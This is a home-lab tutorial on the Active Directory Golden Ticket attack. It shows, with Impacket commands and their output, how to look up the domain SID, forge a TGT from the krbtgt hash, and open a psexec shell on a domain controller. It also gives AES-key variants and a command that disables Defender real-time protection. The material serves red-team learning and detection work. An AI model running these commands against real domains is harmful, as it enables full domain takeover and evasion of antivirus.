# 🔐 Golden Ticket

A **Golden Ticket** attack involves forging a **Ticket Granting Ticket (TGT)** using the **krbtgt account's secret key** (NT hash or AES key). Since the **krbtgt** account signs all TGTs in a domain, **having its key means you can impersonate anyone**—including domain admins—**and access any resource** in the Active Directory (AD) domain.

### How It Works:

1. The **krbtgt** key is used to **sign the Privileged Attribute Certificate (PAC)** inside TGTs.
2. An attacker with the krbtgt key can:

   * Forge a fake TGT with any **username**
   * Assign any **group memberships** (e.g., Domain Admins)
   * Access **any service** by requesting Service Tickets with this forged TGT

> The forged TGT will be accepted as legitimate by domain controllers, enabling full control.

---

##  Misconfiguration

There is no such encoding needed because it's a post-exploitation step, but we have to turn off Microsoft Defender Antivirus real-time protection for testing:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

##  Practice

###  Key Points:

* **Before Nov 2021**: Any username could be used, even if it didn’t exist.
* **After Nov 2021**: The **username must exist** in Active Directory or the ticket will be rejected.
* Requires **Domain SID** and **krbtgt NT hash** or **AES key**.
* Typically retrieved via **DCSync attack** (requires Domain Admin access).
* It’s a **lateral movement** technique, **not** for privilege escalation.

---

## Golden Ticket Creation 

Let’s suppose we have the krbtgt account hash:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7744a497b2191ab8c054b469fa11c7ec:::
```

And we know the username `jack` with password `complex`.

---

### 1. Find the Domain SID

Use `lookupsid.py`:

```bash
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/User@DC' 0
```

Example:

```bash
┌──(kali㉿kali)-[~/Home-lab/Kerbrose/forged-ticket/golden-ticket]
└─$ impacket-lookupsid furious.local/jack:complex1@@furious.local 0

[*] Brute forcing SIDs at furious.local
[*] StringBinding ncacn_np:furious.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3290932372-4080220911-1111251399
```

---

### 2. Create Golden Ticket with RC4 Key (NT hash)

```bash
impacket-ticketer -nthash "7744a497b2191ab8c054b469fa11c7ec" -domain-sid "S-1-5-21-3290932372-4080220911-1111251399" -domain "furious.local" "administrator"
```


```bash
──(kali㉿kali)-[~/Home-lab/Kerbrose/forged-ticket/golden-ticket]
└─$ impacket-ticketer -nthash "7744a497b2191ab8c054b469fa11c7ec" -domain-sid "S-1-5-21-3290932372-4080220911-1111251399" -domain "furious.local" "administrator" 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for furious.local/administrator
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache
```

---

### 3. Export the Ticket

```bash
export KRB5CCNAME=administrator.ccache
```


### 4. Use Impacket psexec for Testing

```bash
impacket-psexec -k -no-pass furious.local/administrator@DC01-FURIOUS5.furious.local
```

```bash
┌──(kali㉿kali)-[~/Home-lab/Kerbrose/forged-ticket/golden-ticket]
└─$ impacket-psexec -k -no-pass furious.local/administrator@DC01-FURIOUS5.furious.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01-FURIOUS5.furious.local.....
[*] Found writable share ADMIN$
[*] Uploading file myGqwtnQ.exe
[*] Opening SVCManager on DC01-FURIOUS5.furious.local.....
[*] Creating service lhEm on DC01-FURIOUS5.furious.local.....
[*] Starting service lhEm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd ..
 
C:\Windows> 
```

---



####  Alternative: Golden Ticket with AES Key (Preferred, Stealthier)

```bash
ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"
```

#### Customize User ID and Group IDs

```bash
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id 500 -groups 512,513,520 "randomuser"
```
